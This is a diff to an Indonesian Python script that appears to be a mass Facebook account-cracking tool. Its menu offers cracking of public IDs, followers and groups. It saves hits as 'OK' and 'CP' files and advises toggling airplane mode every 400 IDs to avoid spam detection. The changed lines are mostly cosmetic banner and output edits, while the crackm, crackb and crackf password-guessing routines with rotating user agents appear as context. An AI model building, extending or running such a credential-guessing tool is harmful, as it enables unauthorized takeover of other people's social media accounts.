@@ -205,12 +205,12 @@ cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 		
 #
 def banner():
-	cetak(panel(f"""\t  [bold cyan]______  ___   _________  _______________ 
-\t  [bold cyan]| ___ \/ _ \ |___  /|  \/  || ___ \  ___|
-\t  [bold cyan]| |_/ / /_\ \   / / | .  . || |_/ / |_   
-\t  [bold cyan]| ___ \  _  |  / /  | |\/| || ___ \  _|  
-\t  [bold cyan]| |_/ / | | |./ /___| |  | || |_/ / |    
-\t  [bold cyan]\____/\_| |_/\_____/\_|  |_/\____/\_|
+	cetak(panel(f"""\t   [bold cyan]______  ___   _________  _______________ 
+\t   [bold cyan]| ___ \/ _ \ |___  /|  \/  || ___ \  ___|
+\t   [bold cyan]| |_/ / /_\ \   / / | .  . || |_/ / |_   
+\t   [bold cyan]| ___ \  _  |  / /  | |\/| || ___ \  _|  
+\t   [bold cyan]| |_/ / | | |./ /___| |  | || |_/ / |    
+\t   [bold cyan]\____/\_| |_/\_____/\_|  |_/\____/\_|
                    """,width=70,title=f"",subtitle=f"[bold white] 2.2 [/]",style=f"{warna_kolor}"))
 
 #
@@ -279,8 +279,9 @@ def menu(id):
 	banner()
 	iplu = requests.get("https://api.ipify.org").text
 	gpp = []
-	gpp.append(panel(f'[cyan]Nama   : -\nUid    : {id}\nLahir  : -  ',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
-	gpp.append(panel(f'[cyan]Author   : Muh Basari\nUip      : {iplu}\nTanggal  : {tgl} {bln} {thn}',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
+	ghku = 'Basari-ID'
+	gpp.append(panel(f'[cyan]Status   : Free\nUid    : {id}\nUip    : -  ',width=34,padding=(0,2),title=f"[bold cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
+	gpp.append(panel(f'[cyan]Author   : Muh Basari\nGithub   : {ghku}\nTanggal  : {tgl} {bln} {thn}',width=34,padding=(0,2),title=f"[bold cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
 	ba.print(Columns(gpp))
 	cetak(panel(f'\t                  [bold cyan] Menu Script',width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f' [cyan]01. Crack Publik Massal\n [cyan]02. Crack Followers\n [cyan]03. [cyan]Crack Grup Fb\n [cyan]04. Hasil Crack Akun\n [cyan]05. Lapor Bug Sc\n [cyan]00. Keluar Hapus Cokis',width=70,title=f"",style=f"{warna_kolor}"))
@@ -539,9 +540,8 @@ def setting():
 #
 def wordlist():
 	global prog,des
-	cetak(panel(f'           [white]Hasil [green]OK[white] Tersimpan Di : [green]OK/%s [white]'%(okc),width=70,title=f"",style=f"{warna_kolor}"))
-	cetak(panel(f'           [white]Hasil [yellow]CP[white] Tersimpan Di : [yellow]CP/%s [white]'%(cpc),width=70,title=f"",style=f"{warna_kolor}"))
-	cetak(panel(f'      [cyan]On/Of Mode Pesawat Setiap 400 Id Agar Tidak Terkena Spam',width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'      [white]Hasil [green]OK[white] Tersimpan Di : [green]OK/%s [white]\n      [white]Hasil [yellow]CP[white] Tersimpan Di : [yellow]CP/%s [white]'%(okc),width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'    [cyan]On/Of Mode Pesawat Setiap 400 Id Agar Tidak Terkena Spam',width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id))
 	with prog:
@@ -579,8 +579,10 @@ def wordlist():
 				else:
 					pool.submit(crackf,idf,pwv)
 		print('')
+		print('')
 		print(f'{h} OK : {h}%s '%(ok))
 		print(f'{k} CP : {k}%s{x} '%(cp))
+		print('')
 		print('')
 	
 #
@@ -589,7 +591,7 @@ def crackm(idf,pwv):
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
 	fff = '%'
-	prog.update(des,description=f'! [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
 	prog.advance(des)
 	ua = random.choice(ugenm)
 	ses = requests.Session()
@@ -628,7 +630,7 @@ def crackb(idf,pwv):
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
 	fff = '%'
-	prog.update(des,description=f'> [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
 	prog.advance(des)
 	ua = random.choice(ugenb)
 	ses = requests.Session()
@@ -667,7 +669,7 @@ def crackf(idf,pwv):
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
 	fff = '%'
-	prog.update(des,description=f'- [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
 	prog.advance(des)
 	ua = random.choice(ugenf)
 	ses = requests.Session()
